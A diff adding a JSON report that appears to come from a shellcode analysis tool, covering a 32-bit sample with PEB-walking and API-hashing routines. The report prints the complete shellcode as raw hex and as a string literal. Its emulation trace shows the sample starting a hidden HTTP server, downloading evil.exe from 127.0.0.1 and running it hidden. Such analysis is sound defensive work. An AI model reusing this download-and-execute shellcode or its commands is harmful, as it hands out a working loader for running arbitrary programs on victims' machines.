@@ -1,0 +1,273 @@
+{
+   "dateAnalyzed": "2022-05-17 15:47:04",
+   "classification": "Very likely shellcode.",
+   "reason": "Found shellcode APIs.",
+   "secondsSinceEpoch": 1652820424.395894,
+   "fileType": "rawHex",
+   "bits": 32,
+   "entryPoint": "0x0",
+   "md5": "dbdd88ccabe9f76d683ebc217f92018a",
+   "sha256": "2c5480f6c54db685d5bd0d828e347e27491cb6e03c63be5d93a5d2277e99635a",
+   "ssdeep": "12:Kafl6FZlYNx4n1Mrt3J6srDmJZj4e/kU/KoL/Kom:NfaYNx4n1MZ6+i+tkK2K/",
+   "pushret": [],
+   "callpop": [
+      {
+         "address": "0x0",
+         "modSecName": "rawHex",
+         "pop_offset": "0x5",
+         "distance": 5,
+         "disassembly": [
+            "0x0        call 5 ",
+            "0x5        pop  edx "
+         ],
+         "disasm": [
+            {
+               "offset": "0x0",
+               "instruction": "call 5"
+            },
+            {
+               "offset": "0x5",
+               "instruction": "pop edx"
+            }
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 7
+         }
+      }
+   ],
+   "PEB": [
+      {
+         "address": "0xb1",
+         "modSecName": "rawHex",
+         "disassembly": [
+            "0xb1       mov  edi, dword ptr fs:[0x30] ",
+            "0xb8       mov  edi, dword ptr [edi + 0xc] ",
+            "0xbb       mov  edi, dword ptr [edi + 0x14] ",
+            "0xbe       mov  esi, dword ptr [edi + 0x28] ",
+            "0xc1       xor  edx, edx "
+         ],
+         "disasm": [
+            {
+               "offset": "0xb1",
+               "instruction": "mov edi, dword ptr fs:[0x30]"
+            },
+            {
+               "offset": "0xb8",
+               "instruction": "mov edi, dword ptr [edi + 0xc]"
+            },
+            {
+               "offset": "0xbb",
+               "instruction": "mov edi, dword ptr [edi + 0x14]"
+            },
+            {
+               "offset": "0xbe",
+               "instruction": "mov esi, dword ptr [edi + 0x28]"
+            },
+            {
+               "offset": "0xc1",
+               "instruction": "xor edx, edx"
+            }
+         ],
+         "internalData": {
+            "secNum": -1,
+            "NumOpsDis": 19,
+            "points": 3
+         }
+      }
+   ],
+   "fstenv": [],
+   "heavensGate": [],
+   "syscall": [],
+   "strings": [
+      {
+         "type": "ascii",
+         "offset": "0x171",
+         "length": "11",
+         "value": "urlmon.dll",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x17c",
+         "length": "41",
+         "value": "cmd.exe /c python -m SimpleHTTPServer 80",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x1a5",
+         "length": "26",
+         "value": "http://127.0.0.1/evil.exe",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x1bf",
+         "length": "35",
+         "value": "C:\\Users\\AppSec\\Downloads\\evil.exe",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x1e2",
+         "length": "46",
+         "value": "cmd.exe /c C:\\Users\\AppSec\\Downloads\\evil.exe",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x171",
+         "length": "11",
+         "value": "urlmon.dll",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x17c",
+         "length": "41",
+         "value": "cmd.exe /c python -m SimpleHTTPServer 80",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x1a5",
+         "length": "26",
+         "value": "http://127.0.0.1/evil.exe",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x1bf",
+         "length": "35",
+         "value": "C:\\Users\\AppSec\\Downloads\\evil.exe",
+         "source": "shellcode"
+      },
+      {
+         "type": "ascii",
+         "offset": "0x1e2",
+         "length": "46",
+         "value": "cmd.exe /c C:\\Users\\AppSec\\Downloads\\evil.exe",
+         "source": "shellcode"
+      }
+   ],
+   "shellcode": {
+      "rawhex": "e8000000005a8d52fb89e581ec0010000052bb8efe1f4be8920000005a555289c58db2490100008dba59010000e8b20000005a5d55528d827101000050ff925d0100005a5d555289c58db2650100008dba6d010000e88a0000005a5d55528db27c01000031c95156ff92610100005a5d555231c951518db2bf010000568dbaa50100005751ff926d0100005a5d55528db2e201000031c95156ff92610100005a5d555231c951ff92590100005a5dfc31ff648b3d300000008b7f0c8b7f148b772831d266ad84c074113c4172063c5a77020c20c1c20730c2ebe939da8b47108b3f75dbc389ea03523c8b527801ea8b5a2001eb31c957568b368b3b01ef5231d2c1c207321747803f0075f5925a39f0740c83c30441394a1875df5e5fc35e5fad565389eb89de035a248d044b0fb7008d048603421c8b0001f0ab5b5e83c30441813effff000075adc3192b90952680acc8ad6dbfe8ffff000004000000010000000200000099235dd9ffff00000300000075726c6d6f6e2e646c6c00636d642e657865202f6320707974686f6e202d6d2053696d706c654854545053657276657220383000687474703a2f2f3132372e302e302e312f6576696c2e65786500433a5c55736572735c4170705365635c446f776e6c6f6164735c6576696c2e65786500636d642e657865202f6320433a5c55736572735c4170705365635c446f776e6c6f6164735c6576696c2e65786500",
+      "strlit": "\\xe8\\x00\\x00\\x00\\x00\\x5a\\x8d\\x52\\xfb\\x89\\xe5\\x81\\xec\\x00\\x10\\x00\\x00\\x52\\xbb\\x8e\\xfe\\x1f\\x4b\\xe8\\x92\\x00\\x00\\x00\\x5a\\x55\\x52\\x89\\xc5\\x8d\\xb2\\x49\\x01\\x00\\x00\\x8d\\xba\\x59\\x01\\x00\\x00\\xe8\\xb2\\x00\\x00\\x00\\x5a\\x5d\\x55\\x52\\x8d\\x82\\x71\\x01\\x00\\x00\\x50\\xff\\x92\\x5d\\x01\\x00\\x00\\x5a\\x5d\\x55\\x52\\x89\\xc5\\x8d\\xb2\\x65\\x01\\x00\\x00\\x8d\\xba\\x6d\\x01\\x00\\x00\\xe8\\x8a\\x00\\x00\\x00\\x5a\\x5d\\x55\\x52\\x8d\\xb2\\x7c\\x01\\x00\\x00\\x31\\xc9\\x51\\x56\\xff\\x92\\x61\\x01\\x00\\x00\\x5a\\x5d\\x55\\x52\\x31\\xc9\\x51\\x51\\x8d\\xb2\\xbf\\x01\\x00\\x00\\x56\\x8d\\xba\\xa5\\x01\\x00\\x00\\x57\\x51\\xff\\x92\\x6d\\x01\\x00\\x00\\x5a\\x5d\\x55\\x52\\x8d\\xb2\\xe2\\x01\\x00\\x00\\x31\\xc9\\x51\\x56\\xff\\x92\\x61\\x01\\x00\\x00\\x5a\\x5d\\x55\\x52\\x31\\xc9\\x51\\xff\\x92\\x59\\x01\\x00\\x00\\x5a\\x5d\\xfc\\x31\\xff\\x64\\x8b\\x3d\\x30\\x00\\x00\\x00\\x8b\\x7f\\x0c\\x8b\\x7f\\x14\\x8b\\x77\\x28\\x31\\xd2\\x66\\xad\\x84\\xc0\\x74\\x11\\x3c\\x41\\x72\\x06\\x3c\\x5a\\x77\\x02\\x0c\\x20\\xc1\\xc2\\x07\\x30\\xc2\\xeb\\xe9\\x39\\xda\\x8b\\x47\\x10\\x8b\\x3f\\x75\\xdb\\xc3\\x89\\xea\\x03\\x52\\x3c\\x8b\\x52\\x78\\x01\\xea\\x8b\\x5a\\x20\\x01\\xeb\\x31\\xc9\\x57\\x56\\x8b\\x36\\x8b\\x3b\\x01\\xef\\x52\\x31\\xd2\\xc1\\xc2\\x07\\x32\\x17\\x47\\x80\\x3f\\x00\\x75\\xf5\\x92\\x5a\\x39\\xf0\\x74\\x0c\\x83\\xc3\\x04\\x41\\x39\\x4a\\x18\\x75\\xdf\\x5e\\x5f\\xc3\\x5e\\x5f\\xad\\x56\\x53\\x89\\xeb\\x89\\xde\\x03\\x5a\\x24\\x8d\\x04\\x4b\\x0f\\xb7\\x00\\x8d\\x04\\x86\\x03\\x42\\x1c\\x8b\\x00\\x01\\xf0\\xab\\x5b\\x5e\\x83\\xc3\\x04\\x41\\x81\\x3e\\xff\\xff\\x00\\x00\\x75\\xad\\xc3\\x19\\x2b\\x90\\x95\\x26\\x80\\xac\\xc8\\xad\\x6d\\xbf\\xe8\\xff\\xff\\x00\\x00\\x04\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x99\\x23\\x5d\\xd9\\xff\\xff\\x00\\x00\\x03\\x00\\x00\\x00\\x75\\x72\\x6c\\x6d\\x6f\\x6e\\x2e\\x64\\x6c\\x6c\\x00\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\\x63\\x20\\x70\\x79\\x74\\x68\\x6f\\x6e\\x20\\x2d\\x6d\\x20\\x53\\x69\\x6d\\x70\\x6c\\x65\\x48\\x54\\x54\\x50\\x53\\x65\\x72\\x76\\x65\\x72\\x20\\x38\\x30\\x00\\x68\\x74\\x74\\x70\\x3a\\x2f\\x2f\\x31\\x32\\x37\\x2e\\x30\\x2e\\x30\\x2e\\x31\\x2f\\x65\\x76\\x69\\x6c\\x2e\\x65\\x78\\x65\\x00\\x43\\x3a\\x5c\\x55\\x73\\x65\\x72\\x73\\x5c\\x41\\x70\\x70\\x53\\x65\\x63\\x5c\\x44\\x6f\\x77\\x6e\\x6c\\x6f\\x61\\x64\\x73\\x5c\\x65\\x76\\x69\\x6c\\x2e\\x65\\x78\\x65\\x00\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\\x63\\x20\\x43\\x3a\\x5c\\x55\\x73\\x65\\x72\\x73\\x5c\\x41\\x70\\x70\\x53\\x65\\x63\\x5c\\x44\\x6f\\x77\\x6e\\x6c\\x6f\\x61\\x64\\x73\\x5c\\x65\\x76\\x69\\x6c\\x2e\\x65\\x78\\x65\\x00"
+   },
+   "deobfuscation": {
+      "deobfuscated": false,
+      "decoded_stub": "N/A",
+      "md5": "N/A",
+      "sha256": "N/A",
+      "ssdeep": "N/A"
+   },
+   "emulation": {
+      "api_calls": [
+         {
+            "api_name": "LoadLibraryA",
+            "dll_name": "kernel32.dll",
+            "return_value": "HINSTANCE 0x16212288",
+            "address": "0x1200003d",
+            "parameters": [
+               {
+                  "type": "LPCTSTR lpLibFileName",
+                  "value": "urlmon.dll"
+               }
+            ]
+         },
+         {
+            "api_name": "WinExec",
+            "dll_name": "kernel32.dll",
+            "return_value": "INT 0x20",
+            "address": "0x12000068",
+            "parameters": [
+               {
+                  "type": "LPCSTR lpCmdLine",
+                  "value": "cmd.exe /c python -m SimpleHTTPServer 80"
+               },
+               {
+                  "type": "UINT uCmdShow",
+                  "value": "SW_HIDE"
+               }
+            ]
+         },
+         {
+            "api_name": "URLDownloadToFileA",
+            "dll_name": "kernel32.dll",
+            "return_value": "INT S_OK",
+            "address": "0x12000085",
+            "parameters": [
+               {
+                  "type": "LPUNKNOWN pCaller",
+                  "value": "0x0"
+               },
+               {
+                  "type": "LPCSTR szURL",
+                  "value": "http://127.0.0.1/evil.exe"
+               },
+               {
+                  "type": "LPCSTR szFileName",
+                  "value": "C:\\Users\\AppSec\\Downloads\\evil.exe"
+               },
+               {
+                  "type": "DWORD dwReserved",
+                  "value": "0x0"
+               },
+               {
+                  "type": "LPBINDSTATUSCALLBACK lpfnCB",
+                  "value": "0x0"
+               }
+            ]
+         },
+         {
+            "api_name": "WinExec",
+            "dll_name": "kernel32.dll",
+            "return_value": "INT 0x20",
+            "address": "0x12000099",
+            "parameters": [
+               {
+                  "type": "LPCSTR lpCmdLine",
+                  "value": "cmd.exe /c C:\\Users\\AppSec\\Downloads\\evil.exe"
+               },
+               {
+                  "type": "UINT uCmdShow",
+                  "value": "SW_HIDE"
+               }
+            ]
+         },
+         {
+            "api_name": "ExitProcess",
+            "dll_name": "kernel32.dll",
+            "return_value": " None",
+            "address": "0x120000a6",
+            "parameters": [
+               {
+                  "type": "UINT uExitCode",
+                  "value": 0
+               }
+            ]
+         }
+      ],
+      "dlls": [
+         "kernel32",
+         "urlmon"
+      ],
+      "path_artifacts": [],
+      "file_artifacts": [
+         "urlmon.dll",
+         "cmd.exe"
+      ],
+      "commandLine_artifacts": [
+         "cmd.exe /c python -m SimpleHTTPServer 80",
+         "cmd.exe /c C:\\Users\\AppSec\\Downloads\\evil.exe"
+      ],
+      "web_artifacts": [
+         "http://127.0.0.1/evil.exe"
+      ],
+      "registry_artifacts": [],
+      "exe_dll_artifacts": [
+         "C:\\Users\\AppSec\\Downloads\\evil.exe"
+      ]
+   }
+}
